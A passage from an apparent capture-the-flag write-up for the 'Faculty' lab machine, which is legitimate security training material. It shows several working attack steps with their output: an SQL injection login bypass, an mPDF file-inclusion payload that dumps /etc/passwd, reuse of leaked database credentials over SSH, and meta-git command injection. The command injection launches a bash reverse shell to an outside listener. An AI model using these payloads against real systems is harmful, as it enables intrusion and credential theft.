</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirb/big.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/admin                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://faculty.htb/admin/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">20469</span> / <span style="color:#ae81ff">20470</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Finished
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span></code></pre></div><p><img src="/images/faculty1.png" alt="faculty1"></p>
<p><img src="/images/faculty2.png" alt="faculty2"></p>
<h2 id="initial-access">Initial Access</h2>
<h3 id="sql-injection">SQL Injection</h3>
<p>Let&rsquo;s try a simple login bypass on the primary faculty login page: <code>' or 1=1;-- -</code></p>
<p><img src="/images/faculty3.png" alt="faculty3"></p>
<p>Not a whole lot we can do here. Let&rsquo;s try the same injection on the admin login page: <code>' or 1=1;-- -</code> for the user, and anything goes for the password.</p>
<p><img src="/images/faculty4.png" alt="faculty4"></p>
<p><img src="/images/faculty5.png" alt="faculty5"></p>
<p>I notice that on all of the menu tabs on the left, there is a button to export the data to a <code>.pdf</code> file.</p>
<p><img src="/images/faculty6.png" alt="faculty6"></p>
<p>And when viewing that <code>.pdf</code>, especially the URL its stored in, it would appear the website is using the <code>mpdf</code> library for generation.</p>
<p><img src="/images/faculty7.png" alt="faculty7"></p>
<p><img src="/images/faculty8.png" alt="faculty8"></p>
<h3 id="mpdf-vulnerability">MPDF Vulnerability</h3>
<p>After a little research, it appears MPDF 6.0 might be vulnerable to a Local File Inclusion vulnerability detailed in this <a href="https://github.com/mpdf/mpdf/issues/356" target="_blank">GitHub issue</a>.  It would appear the following code can include local files into the generated PDF:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">annotation</span> <span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span>  <span style="color:#a6e22e">icon</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Graph&#34;</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Attached File: /etc/passwd&#34;</span> <span style="color:#a6e22e">pos-x</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;195&#34;</span> /&gt;
</span></span></code></pre></div><p>Examining the POST request to MPDF that generates the PDF file, it appears the data is base64 encoded, and then double URL encoded.</p>
<p><img src="/images/faculty9.png" alt="faculty9"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;top&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;faculty.htb&lt;/<span style="color:#f92672">h1</span>&gt;&lt;<span style="color:#f92672">h2</span>&gt;Courses&lt;/<span style="color:#f92672">h2</span>&gt;&lt;<span style="color:#f92672">table</span>&gt;	&lt;<span style="color:#f92672">thead</span>&gt;		&lt;<span style="color:#f92672">tr</span>&gt;			&lt;<span style="color:#f92672">th</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;#&lt;/<span style="color:#f92672">th</span>&gt;			&lt;<span style="color:#f92672">th</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;Course&lt;/<span style="color:#f92672">th</span>&gt;			&lt;<span style="color:#f92672">th</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;Description&lt;/<span style="color:#f92672">th</span>&gt;			&lt;/<span style="color:#f92672">tr</span>&gt;&lt;/<span style="color:#f92672">thead</span>&gt;&lt;<span style="color:#f92672">tbody</span>&gt;&lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;1&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;Information Technology&lt;/<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;&lt;<span style="color:#f92672">small</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;IT&lt;/<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">small</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;2&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;BSCS&lt;/<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;&lt;<span style="color:#f92672">small</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;Bachelor of Science in Computer Science&lt;/<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">small</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;3&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;BSIS&lt;/<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;&lt;<span style="color:#f92672">small</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;Bachelor of Science in Information Systems&lt;/<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">small</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;4&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;BSED&lt;/<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-center&#34;</span>&gt;&lt;<span style="color:#f92672">small</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;Bachelor in Secondary Education&lt;/<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">small</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;&lt;/<span style="color:#f92672">tboby</span>&gt;&lt;/<span style="color:#f92672">table</span>&gt;
</span></span></code></pre></div><p>Let&rsquo;s take our payload from the GitHub issue, double URL encode it, then base64 encode it, and send it to MPDF to see what happens. It appears we successfully grabbed <code>/etc/passwd</code> and it was attached to the PDF file.</p>
<p><img src="/images/faculty10.png" alt="faculty10"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span style="display:flex;"><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
</span></span><span style="display:flex;"><span>sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span style="display:flex;"><span>mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style="display:flex;"><span>gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
</span></span><span style="display:flex;"><span>postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>developer:x:1001:1002:,,,:/home/developer:/bin/bash
</span></span><span style="display:flex;"><span>usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span></code></pre></div><h4 id="file-enumeration">File Enumeration</h4>
<p><code>ajax.php</code> seemed pretty important, as it handled all the login and navigation requests from the web application. Let&rsquo;s look at that.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ob_start</span>();
</span></span><span style="display:flex;"><span>$action <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;action&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;admin_class.php&#39;</span>;
</span></span><span style="display:flex;"><span>$crud <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Action</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;login&#39;</span>){
</span></span><span style="display:flex;"><span>        $login <span style="color:#f92672">=</span> $crud<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">login</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($login)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> $login;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">--</span><span style="color:#a6e22e">snip</span><span style="color:#f92672">--</span>]
</span></span></code></pre></div><p>Not much in there, but I bet <code>admin_class.php</code> might have some interesting info. Let&rsquo;s take a look.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;display_errors&#39;</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Class</span> <span style="color:#a6e22e">Action</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> $db;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct() {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ob_start</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;db_connect.php&#39;</span>;
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">--</span><span style="color:#a6e22e">snip</span><span style="color:#f92672">--</span>]
</span></span></code></pre></div><p>Now we&rsquo;re starting to see files that we know usually contain usernames and passwords. Third time&rsquo;s a charm, let&rsquo;s check out <code>db_connect.php</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$conn<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#e6db74">&#39;sched&#39;</span>,<span style="color:#e6db74">&#39;Co.met06aci.dly53ro.per&#39;</span>,<span style="color:#e6db74">&#39;scheduling_db&#39;</span>)<span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Could not connect to mysql&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mysqli_error</span>($con));
</span></span></code></pre></div><p>Credentials! <code>sched:Co.met06aci.dly53ro.per</code></p>
<h3 id="pass-the-password">Pass the Password</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/faculty<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ netexec ssh faculty.htb -u users.txt -p <span style="color:#e6db74">&#39;Co.met06aci.dly53ro.per&#39;</span> --continue-on-success
</span></span><span style="display:flex;"><span>SSH   10.129.227.208  <span style="color:#ae81ff">22</span>  faculty.htb  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
</span></span><span style="display:flex;"><span>SSH   10.129.227.208  <span style="color:#ae81ff">22</span>  faculty.htb  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> root:Co.met06aci.dly53ro.per
</span></span><span style="display:flex;"><span>SSH   10.129.227.208  <span style="color:#ae81ff">22</span>  faculty.htb  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> developer:Co.met06aci.dly53ro.per
</span></span><span style="display:flex;"><span>SSH   10.129.227.208  <span style="color:#ae81ff">22</span>  faculty.htb  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> gbyolo:Co.met06aci.dly53ro.per  Linux - Shell access!
</span></span></code></pre></div><h2 id="shell-as-gbyolo">Shell as gbyolo</h2>
<h3 id="mail">mail</h3>
<p>Upon logging in via SSH, I immediately see the user <code>gbyolo</code> has mail. Let&rsquo;s check it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gbyolo@faculty:~$ mail
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;/var/mail/gbyolo&#34;</span>: <span style="color:#ae81ff">1</span> message <span style="color:#ae81ff">1</span> unread
</span></span><span style="display:flex;"><span>&gt;U   <span style="color:#ae81ff">1</span> developer@faculty. Tue Nov <span style="color:#ae81ff">10</span> 15:03  16/623   Faculty group
</span></span><span style="display:flex;"><span>? <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Return-Path: &lt;developer@faculty.htb&gt;
</span></span><span style="display:flex;"><span>X-Original-To: gbyolo@faculty.htb
</span></span><span style="display:flex;"><span>Delivered-To: gbyolo@faculty.htb
</span></span><span style="display:flex;"><span>Received: by faculty.htb <span style="color:#f92672">(</span>Postfix, from userid 1001<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        id 0399E26125A; Tue, <span style="color:#ae81ff">10</span> Nov <span style="color:#ae81ff">2020</span> 15:03:02 +0100 <span style="color:#f92672">(</span>CET<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Subject: Faculty group
</span></span><span style="display:flex;"><span>To: &lt;gbyolo@faculty.htb&gt;
</span></span><span style="display:flex;"><span>X-Mailer: mail <span style="color:#f92672">(</span>GNU Mailutils 3.7<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Message-Id: &lt;20201110140302.0399E26125A@faculty.htb&gt;
</span></span><span style="display:flex;"><span>Date: Tue, <span style="color:#ae81ff">10</span> Nov <span style="color:#ae81ff">2020</span> 15:03:02 +0100 <span style="color:#f92672">(</span>CET<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>From: developer@faculty.htb
</span></span><span style="display:flex;"><span>X-IMAPbase: <span style="color:#ae81ff">1605016995</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Status: O
</span></span><span style="display:flex;"><span>X-UID: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and <span style="color:#66d9ef">if</span> you have troubles just let me know!<span style="color:#ae81ff">\n</span>developer@faculty.htb
</span></span></code></pre></div><h3 id="sudo--l">sudo -l</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gbyolo@faculty:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> gbyolo on faculty:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User gbyolo may run the following commands on faculty:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> /usr/local/bin/meta-git
</span></span></code></pre></div><h3 id="meta-git">meta-git</h3>
<p>A quick search for <code>meta-git exploit</code> brings me to this article from <a href="https://hackerone.com/reports/728040" target="_blank">Hacker One</a>. It appears we can achieve <del>remote</del> code execution. Let&rsquo;s test it out.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gbyolo@faculty:/tmp$ sudo -u developer meta-git clone <span style="color:#e6db74">&#39;sss||touch HACKED&#39;</span>
</span></span><span style="display:flex;"><span>meta git cloning into <span style="color:#e6db74">&#39;sss||touch HACKED&#39;</span> at sss<span style="color:#f92672">||</span>touch HACKED
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sss<span style="color:#f92672">||</span>touch HACKED:
</span></span><span style="display:flex;"><span>fatal: repository <span style="color:#e6db74">&#39;sss&#39;</span> does not exist
</span></span><span style="display:flex;"><span>sss<span style="color:#f92672">||</span>touch HACKED ✓
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>node:7954<span style="color:#f92672">)</span> UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir <span style="color:#e6db74">&#39;/tmp/sss||touch HACKED&#39;</span>
</span></span><span style="display:flex;"><span>    at process.chdir <span style="color:#f92672">(</span>internal/process/main_thread_only.js:31:12<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    at exec <span style="color:#f92672">(</span>/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    at execPromise.then.catch.errorMessage <span style="color:#f92672">(</span>/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    at process._tickCallback <span style="color:#f92672">(</span>internal/process/next_tick.js:68:7<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    at Function.Module.runMain <span style="color:#f92672">(</span>internal/modules/cjs/loader.js:834:11<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    at startup <span style="color:#f92672">(</span>internal/bootstrap/node.js:283:19<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    at bootstrapNodeJSCore <span style="color:#f92672">(</span>internal/bootstrap/node.js:623:3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>node:7954<span style="color:#f92672">)</span> UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async <span style="color:#66d9ef">function</span> without a catch block, or by rejecting a promise which was not handled with .catch<span style="color:#f92672">()</span>. <span style="color:#f92672">(</span>rejection id: 1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>node:7954<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>DEP0018<span style="color:#f92672">]</span> DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gbyolo@faculty:/tmp$ ls -al
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>drwxrwxrwt <span style="color:#ae81ff">12</span> root      root      <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">11</span> 19:24 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">19</span> root      root      <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2022</span> ..
</span></span><span style="display:flex;"><span>drwxrwxrwt  <span style="color:#ae81ff">2</span> root      root      <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">11</span> 16:39 .ICE-unix
</span></span><span style="display:flex;"><span>drwxrwxrwt  <span style="color:#ae81ff">2</span> root      root      <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">11</span> 16:39 .Test-unix
</span></span><span style="display:flex;"><span>drwxrwxrwt  <span style="color:#ae81ff">2</span> root      root      <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">11</span> 16:39 .X11-unix
</span></span><span style="display:flex;"><span>drwxrwxrwt  <span style="color:#ae81ff">2</span> root      root      <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">11</span> 16:39 .XIM-unix
</span></span><span style="display:flex;"><span>drwxrwxrwt  <span style="color:#ae81ff">2</span> root      root      <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">11</span> 16:39 .font-unix
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> developer developer    <span style="color:#ae81ff">0</span> Feb <span style="color:#ae81ff">11</span> 19:24 HACKED
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> developer developer    <span style="color:#ae81ff">0</span> Feb <span style="color:#ae81ff">11</span> 19:24 sss
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>--snip--<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Let&rsquo;s rework the command to hopefully get a shell as <code>developer</code>. I&rsquo;ll create a <code>.sh</code> file as follows, and then execute with the exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/10.10.14.42/4444 0&gt;&amp;<span style="color:#ae81ff">1</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gbyolo@faculty:/tmp$ sudo -u developer meta-git clone <span style="color:#e6db74">&#39;sss||bash /tmp/shell.sh&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/faculty<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nc -nvlp <span style="color:#ae81ff">4444</span>                 
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.42<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.227.208<span style="color:#f92672">]</span> <span style="color:#ae81ff">33344</span>
</span></span><span style="display:flex;"><span>developer@faculty:/tmp$
